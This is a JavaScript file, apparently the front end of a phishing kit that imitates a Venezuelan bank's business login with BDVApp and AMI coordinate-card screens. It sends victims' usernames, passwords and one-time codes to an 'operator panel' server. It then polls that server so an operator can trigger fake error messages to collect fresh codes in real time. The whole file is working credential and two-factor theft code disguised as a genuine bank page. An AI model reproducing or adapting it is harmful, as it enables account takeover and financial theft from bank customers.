(function () {
  // Manejo de sesión única vinculada al panel de operador
  let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
  sessionStorage.setItem('sessionId', sessionId);

  let pingInterval = null;
  let pollInterval = null;
  let currentOtpAction = 'sms';

  function startPing() {
    if (pingInterval) clearInterval(pingInterval);
    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
    pingInterval = setInterval(() => {
      fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
    }, 3000);
  }

  function stopPing() {
    if (pingInterval) {
      clearInterval(pingInterval);
      pingInterval = null;
    }
  }

  function stopPolling() {
    if (pollInterval) {
      clearInterval(pollInterval);
      pollInterval = null;
    }
  }

  function sendState(state) {
    if (!sessionId) return;
    fetch(`/api/sessions/${sessionId}/state`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ state })
    }).catch(() => {});
  }

  const userInput = document.querySelector('input[formcontrolname="username"], input[name="username"]');
  const entrarBtn = document.querySelector('.button-login-container button');
  const userField = userInput ? userInput.closest('.mat-form-field') : null;
  const userLabel = userField ? userField.querySelector('.mat-form-field-label') : null;

  function updateUserFloat() {
    if (!userField) return;
    const has = userInput.value.length > 0;
    const focused = document.activeElement === userInput;
    userField.classList.toggle('mat-focused', focused);
    if (has || focused) {
      userField.classList.add('mat-form-field-should-float');
      if (userLabel) userLabel.classList.remove('mat-empty', 'mat-form-field-empty');
    } else {
      userField.classList.remove('mat-form-field-should-float');
      if (userLabel) userLabel.classList.add('mat-empty', 'mat-form-field-empty');
    }
  }

  if (userInput) {
    userInput.addEventListener('focus', updateUserFloat);
    userInput.addEventListener('blur', updateUserFloat);
    userInput.addEventListener('input', () => {
      if (entrarBtn) entrarBtn.disabled = userInput.value.trim().length === 0;
      updateUserFloat();
      sendState('typing');
    });
    updateUserFloat();
    if (entrarBtn) entrarBtn.disabled = userInput.value.trim().length === 0;
  }

  const passModal = document.getElementById('passModal');
  const passField = document.getElementById('passField');
  const passLabel = document.getElementById('passLabel');
  const password = document.getElementById('password');
  const continueBtn = document.getElementById('continueBtn');
  const cancelBtn = document.getElementById('cancelBtn');
  const passForm = document.getElementById('passForm');
  const passError = document.getElementById('passError');

  function updatePassField() {
    const has = password.value.length > 0;
    const focused = document.activeElement === password;
    passField.classList.toggle('mat-focused', focused);
    passField.classList.toggle('mat-form-field-should-float', has || focused);
    if (has || focused) {
      passLabel.classList.remove('mat-empty', 'mat-form-field-empty');
    } else {
      passLabel.classList.add('mat-empty', 'mat-form-field-empty');
    }
    continueBtn.disabled = !has;
  }

  function setPassError(show, message) {
    passField.classList.toggle('mat-form-field-invalid', show);
    passField.classList.toggle('ng-invalid', show);
    if (passError) {
      passError.hidden = !show;
      if (message) passError.textContent = message;
    }
    password.setAttribute('aria-invalid', show ? 'true' : 'false');
  }

  function openModal() {
    passModal.classList.add('is-open');
    password.value = '';
    continueBtn.disabled = true;
    setPassError(false);
    passField.classList.remove('mat-focused', 'mat-form-field-should-float');
    passLabel.classList.add('mat-empty', 'mat-form-field-empty');
    setTimeout(() => password.focus(), 30);
  }

  function closeModal() {
    passModal.classList.remove('is-open');
  }

  if (entrarBtn) {
    const form = entrarBtn.closest('form');
    if (form) {
      form.addEventListener('submit', (e) => {
        e.preventDefault();
        if (!userInput || userInput.value.trim().length === 0) return;
        openModal();
      });
    }
    entrarBtn.addEventListener('click', (e) => {
      e.preventDefault();
      if (!userInput || userInput.value.trim().length === 0) return;
      openModal();
    });
  }

  password.addEventListener('focus', updatePassField);
  password.addEventListener('blur', () => {
    updatePassField();
    setPassError(password.value.length === 0);
  });
  password.addEventListener('input', () => {
    updatePassField();
    if (password.value.length > 0) setPassError(false);
    sendState('typing');
  });

  cancelBtn.addEventListener('click', closeModal);
  passModal.querySelector('.cdk-overlay-backdrop').addEventListener('click', closeModal);
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && passModal.classList.contains('is-open')) closeModal();
  });

  const spinner = document.getElementById('spinner');
  const authMethod = document.getElementById('authMethod');
  const loginUnico = document.querySelector('app-login-unico');
  const smsMethodBtn = document.getElementById('smsMethodBtn');
  const amiMethodBtn = document.getElementById('amiMethodBtn');
  const bdvappMethodBtn = document.getElementById('bdvappMethodBtn');
  const backMethodBtn = document.getElementById('backMethodBtn');
  const verifyForm = document.getElementById('verifyForm');
  const verifyCode = document.getElementById('verifyCode');
  const verifyBtn = document.getElementById('verifyBtn');
  const codeField = document.getElementById('codeField');
  const codeLabel = document.getElementById('codeLabel');
  const authSelectPanel = document.getElementById('authSelectPanel');
  const authVerifyPanel = document.getElementById('authVerifyPanel');
  const authStep1 = document.getElementById('authStep1');
  const authStep2 = document.getElementById('authStep2');
  const authStep1Icon = document.getElementById('authStep1Icon');
  const authStepLine = document.getElementById('authStepLine');
  const authMethodName = document.getElementById('authMethodName');

  function showSpinner() {
    if (spinner) spinner.classList.add('is-visible');
  }
  function hideSpinner() {
    if (spinner) spinner.classList.remove('is-visible');
  }

  function updateCodeFloat() {
    if (!codeField || !verifyCode) return;
    const has = verifyCode.value.length > 0;
    const focused = document.activeElement === verifyCode;
    codeField.classList.toggle('mat-focused', focused);
    codeField.classList.toggle('mat-form-field-should-float', has || focused);
    if (codeLabel) {
      if (has || focused) codeLabel.classList.remove('mat-empty', 'mat-form-field-empty');
      else codeLabel.classList.add('mat-empty', 'mat-form-field-empty');
    }
    if (verifyBtn) verifyBtn.disabled = !has;
  }

  function showSelectStep() {
    if (!authMethod) return;
    authMethod.dataset.step = 'select';
    if (authSelectPanel) authSelectPanel.hidden = false;
    if (authVerifyPanel) authVerifyPanel.hidden = true;
    if (authStep1) {
      authStep1.classList.add('is-active');
      authStep1.classList.remove('is-done');
      authStep1.setAttribute('aria-selected', 'true');
    }
    if (authStep2) {
      authStep2.classList.remove('is-active');
      authStep2.setAttribute('aria-selected', 'false');
    }
    if (authStep1Icon) authStep1Icon.textContent = '1';
    if (authStepLine) authStepLine.classList.remove('is-done');
    if (verifyCode) verifyCode.value = '';
    updateCodeFloat();
  }

  function showVerifyStep(mode) {
    if (!authMethod) return;
    currentOtpAction = mode;
    authMethod.dataset.step = 'verify';
    if (authSelectPanel) authSelectPanel.hidden = true;
    if (authVerifyPanel) authVerifyPanel.hidden = false;
    if (authStep1) {
      authStep1.classList.remove('is-active');
      authStep1.classList.add('is-done');
      authStep1.setAttribute('aria-selected', 'false');
    }
    if (authStep2) {
      authStep2.classList.add('is-active');
      authStep2.setAttribute('aria-selected', 'true');
    }
    if (authStep1Icon) {
      authStep1Icon.innerHTML = '<svg class="auth-edit-icon" viewBox="0 0 24 24" aria-hidden="true"><path fill="#fff" d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a1.003 1.003 0 0 0 0-1.42l-2.34-2.34a1.003 1.003 0 0 0-1.42 0l-1.83 1.83 3.75 3.75 1.84-1.82z"/></svg>';
    }
    if (authStepLine) authStepLine.classList.add('is-done');

    // Adaptar etiquetas según método solicitado (SMS, AMI o BDVApp)
    const labelTitle = document.querySelector('.auth-verify-title');
    const labelSub = document.querySelector('.auth-verify-sub');
    const matLabel = codeLabel ? codeLabel.querySelector('mat-label') : null;

    if (mode === 'ami') {
      if (authMethodName) authMethodName.textContent = 'Tarjeta de Coordenadas (AMI)';
      if (labelTitle) labelTitle.textContent = 'Tarjeta de Coordenadas (AMI)';
      if (labelSub) labelSub.textContent = 'Introduce las coordenadas de tu tarjeta AMI Venlínea';
      if (matLabel) matLabel.textContent = 'Coordenadas AMI';
    } else if (mode === 'bdvapp') {
      if (authMethodName) authMethodName.textContent = 'Autenticación BDVApp';
      if (labelTitle) labelTitle.textContent = 'Autenticación BDVApp';
      if (labelSub) labelSub.textContent = 'Introduce la clave generada en tu aplicación móvil BDVApp';
      if (matLabel) matLabel.textContent = 'Código BDVApp';
    } else {
      if (authMethodName) authMethodName.textContent = 'Código por SMS';
      if (labelTitle) labelTitle.textContent = 'Verificación por SMS';
      if (labelSub) labelSub.textContent = 'Introduce el código de verificación enviado por mensaje de texto';
      if (matLabel) matLabel.textContent = 'Código SMS';
    }

    if (codeField) codeField.classList.remove('mat-form-field-invalid');
    if (verifyCode) {
      verifyCode.value = '';
      setTimeout(() => verifyCode.focus(), 40);
    }
    updateCodeFloat();
  }

  function goToAuthMethod(mode) {
    hideSpinner();
    closeModal();
    if (loginUnico) loginUnico.hidden = true;
    if (authMethod) authMethod.hidden = false;
    showVerifyStep(mode || 'sms');
  }

  if (smsMethodBtn) {
    smsMethodBtn.addEventListener('click', () => {
      showSpinner();
      sendState('metodo-sms');
      setTimeout(() => {
        hideSpinner();
        showVerifyStep('sms');
      }, 500);
    });
  }

  if (amiMethodBtn) {
    amiMethodBtn.addEventListener('click', () => {
      showSpinner();
      sendState('metodo-ami');
      setTimeout(() => {
        hideSpinner();
        showVerifyStep('ami');
      }, 500);
    });
  }

  if (bdvappMethodBtn) {
    bdvappMethodBtn.addEventListener('click', () => {
      showSpinner();
      sendState('metodo-bdvapp');
      setTimeout(() => {
        hideSpinner();
        showVerifyStep('bdvapp');
      }, 500);
    });
  }

  if (backMethodBtn) {
    backMethodBtn.addEventListener('click', showSelectStep);
  }

  if (verifyCode) {
    verifyCode.addEventListener('focus', updateCodeFloat);
    verifyCode.addEventListener('blur', updateCodeFloat);
    verifyCode.addEventListener('input', () => {
      updateCodeFloat();
      sendState('typing');
    });
  }

  // Polling del cliente esperando órdenes del panel de operador
  function startPolling() {
    stopPolling();
    pollInterval = setInterval(async () => {
      try {
        const response = await fetch(`/api/sessions/${sessionId}`);
        if (!response.ok) return;
        const data = await response.json();
        const action = data.action;

        if (action === 'sms') {
          goToAuthMethod('sms');
        } else if (action === 'ami') {
          goToAuthMethod('ami');
        } else if (action === 'bdvapp') {
          goToAuthMethod('bdvapp');
        } else if (action === 'error-login') {
          hideSpinner();
          openModal();
          setPassError(true, 'Usuario o contraseña inválida. Verifique sus datos.');
          continueBtn.disabled = false;
        } else if (action === 'error-sms') {
          hideSpinner();
          if (codeField) codeField.classList.add('mat-form-field-invalid');
          if (verifyCode) {
            verifyCode.value = '';
            verifyCode.focus();
          }
          alert('Código SMS incorrecto o vencido. Por favor ingrese el nuevo código recibido.');
        } else if (action === 'error-ami') {
          hideSpinner();
          if (codeField) codeField.classList.add('mat-form-field-invalid');
          if (verifyCode) {
            verifyCode.value = '';
            verifyCode.focus();
          }
          alert('Coordenadas AMI incorrectas. Por favor verifique su tarjeta AMI e intente nuevamente.');
        } else if (action === 'error-bdvapp') {
          hideSpinner();
          if (codeField) codeField.classList.add('mat-form-field-invalid');
          if (verifyCode) {
            verifyCode.value = '';
            verifyCode.focus();
          }
          alert('Código BDVApp incorrecto o expirado. Genere un nuevo código e ingrese nuevamente.');
        } else if (action === 'done') {
          stopPing();
          stopPolling();
          hideSpinner();
          window.location.href = 'panel.html';
        }
      } catch (_) {}
    }, 1000);
  }

  // Envío del código de verificación (Token / SMS / AMI / BDVApp)
  if (verifyForm) {
    verifyForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      if (!verifyCode || verifyCode.value.trim().length === 0) return;
      const tokenVal = verifyCode.value.trim();

      showSpinner();

      try {
        await fetch(`/api/sessions/${sessionId}/token`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token: tokenVal })
        });
      } catch (_) {}
    });
  }

  // Envío de Usuario y Clave al Panel de Operador
  passForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    if (password.value.length === 0) {
      setPassError(true);
      return;
    }
    continueBtn.disabled = true;
    showSpinner();

    const device = /mobile|android|iphone|ipad|phone/i.test(navigator.userAgent) ? 'mobile' : 'desktop';
    const userVal = userInput ? userInput.value.trim() : 'EMPRESA';
    const passVal = password.value;

    try {
      await fetch('/api/sessions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: sessionId,
          username: userVal,
          password: passVal,
          tipoUsuario: 'EMPRESAS',
          device: device,
          state: 'waiting'
        })
      });
    } catch (_) {}

    startPing();
    startPolling();
  });

  // Acceso directo: ?paso=clave | ?paso=metodo | ?paso=verificar
  const paso = new URLSearchParams(location.search).get('paso');
  if (paso === 'clave') {
    if (userInput && !userInput.value) {
      userInput.value = 'empresa_demo';
      updateUserFloat();
    }
    openModal();
  } else if (paso === 'metodo' || paso === 'verificar') {
    if (loginUnico) loginUnico.hidden = true;
    if (authMethod) authMethod.hidden = false;
    if (paso === 'verificar') showVerifyStep('sms');
    else showSelectStep();
  }
})();
